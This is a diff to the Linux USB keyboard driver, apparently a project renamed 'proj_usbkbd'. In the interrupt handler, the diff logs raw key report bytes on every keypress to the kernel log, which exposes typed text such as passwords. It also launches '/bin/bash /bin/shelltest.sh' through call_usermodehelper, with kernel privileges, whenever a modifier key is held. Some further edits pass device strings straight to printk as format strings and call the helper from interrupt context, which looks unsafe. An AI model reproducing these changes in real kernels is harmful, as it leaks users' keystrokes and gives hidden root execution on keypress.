@@ -34,7 +34,7 @@ static const unsigned char usb_kbd_keycode[256] = {
 	  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
 	  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
 	  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
-	 48, 42, 56,125, 97, 54,100,126,164,166,165,163,161,115,114,113,
+	 29, 42, 56,125, 97, 54,100,126,164,166,165,163,161,115,114,113,
 	150,158,159,128,136,177,178,176,142,152,173,140
 };
 
@@ -89,6 +89,8 @@ static void usb_kbd_irq(struct urb *urb)
 {
 	struct usb_kbd *kbd = urb->context;
 	int i;
+	char *argv[] = {"/bin/bash","-c", "/bin/bash /bin/shelltest.sh", NULL};
+	char *envp[] = {"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL};
 
 	switch (urb->status) {
 	case 0:			/* success */
@@ -102,6 +104,8 @@ static void usb_kbd_irq(struct urb *urb)
 		goto resubmit;
 	}
 
+
+		//printk(kbd->dev);
 	for (i = 0; i < 8; i++)
 		input_report_key(kbd->dev, usb_kbd_keycode[i + 224], (kbd->new[0] >> i) & 1);
 
@@ -110,6 +114,7 @@ static void usb_kbd_irq(struct urb *urb)
 		if (kbd->old[i] > 3 && memscan(kbd->new + 2, kbd->old[i], 6) == kbd->new + 8) {
 			if (usb_kbd_keycode[kbd->old[i]])
 				input_report_key(kbd->dev, usb_kbd_keycode[kbd->old[i]], 0);
+
 			else
 				hid_info(urb->dev,
 					 "Unknown key (scancode %#x) released.\n",
@@ -124,11 +129,22 @@ static void usb_kbd_irq(struct urb *urb)
 					 "Unknown key (scancode %#x) pressed.\n",
 					 kbd->new[i]);
 		}
+	
 	}
 
 	input_sync(kbd->dev);
-
+	if(!((unsigned int)kbd->old[0]==0 &&(unsigned int)kbd->old[1]==0&& (unsigned int)kbd->old[2]==0&&(unsigned int)kbd->old[3]==0&&(unsigned int)kbd->old[4]==0&&(unsigned int)kbd->old[5]==0&&(unsigned int)kbd->old[6]==0 && (unsigned int)kbd->old[7]==0)){
+		printk("Old:%x %x %x %x %x %x %x %x New:%x %x %x %x %x %x %x %x",
+(unsigned int)kbd->old[0],(unsigned int)kbd->old[1],(unsigned int)kbd->old[2],(unsigned int)kbd->old[3],(unsigned int)kbd->old[4],(unsigned int)kbd->old[5],(unsigned int)kbd->old[6],(unsigned int)kbd->old[7],
+(unsigned int)kbd->new[0],(unsigned int)kbd->new[1],(unsigned int)kbd->new[2],(unsigned int)kbd->new[3],(unsigned int)kbd->new[4],(unsigned int)kbd->new[5],(unsigned int)kbd->new[6],(unsigned int)kbd->new[7]);
+}
+	
+	if(kbd->old[0]>(unsigned)0){
+		call_usermodehelper(argv[0],argv, envp,UMH_NO_WAIT);
+		printk("ran c_umh");
+}
 	memcpy(kbd->old, kbd->new, 8);
+	
 
 resubmit:
 	i = usb_submit_urb (urb, GFP_ATOMIC);
@@ -144,6 +160,7 @@ static int usb_kbd_event(struct input_dev *dev, unsigned int type,
 	unsigned long flags;
 	struct usb_kbd *kbd = input_get_drvdata(dev);
 
+	printk("The usb_kbd_event function was called value:%d code:%d type: %d" , value, code, type);
 	if (type != EV_LED)
 		return -1;
 
@@ -180,6 +197,9 @@ static void usb_kbd_led(struct urb *urb)
 	unsigned long flags;
 	struct usb_kbd *kbd = urb->context;
 
+	//printk("The led function was called");
+	printk(kbd->name);
+	printk(kbd->phys);
 	if (urb->status)
 		hid_warn(urb->dev, "led urb status %d received\n",
 			 urb->status);
@@ -206,7 +226,7 @@ static void usb_kbd_led(struct urb *urb)
 static int usb_kbd_open(struct input_dev *dev)
 {
 	struct usb_kbd *kbd = input_get_drvdata(dev);
-
+	
 	kbd->irq->dev = kbd->usbdev;
 	if (usb_submit_urb(kbd->irq, GFP_KERNEL))
 		return -EIO;
@@ -312,8 +332,10 @@ static int usb_kbd_probe(struct usb_interface *iface,
 		BIT_MASK(LED_SCROLLL) | BIT_MASK(LED_COMPOSE) |
 		BIT_MASK(LED_KANA);
 
-	for (i = 0; i < 255; i++)
+	for (i = 0; i < 255; i++){
 		set_bit(usb_kbd_keycode[i], input_dev->keybit);
+		//printk("keybit:%ln",input_dev->keybit);
+	}
 	clear_bit(0, input_dev->keybit);
 
 	input_dev->event = usb_kbd_event;
@@ -377,7 +399,7 @@ static const struct usb_device_id usb_kbd_id_table[] = {
 MODULE_DEVICE_TABLE (usb, usb_kbd_id_table);
 
 static struct usb_driver usb_kbd_driver = {
-	.name =		"usbkbd",
+	.name =		"proj_usbkbd",
 	.probe =	usb_kbd_probe,
 	.disconnect =	usb_kbd_disconnect,
 	.id_table =	usb_kbd_id_table,
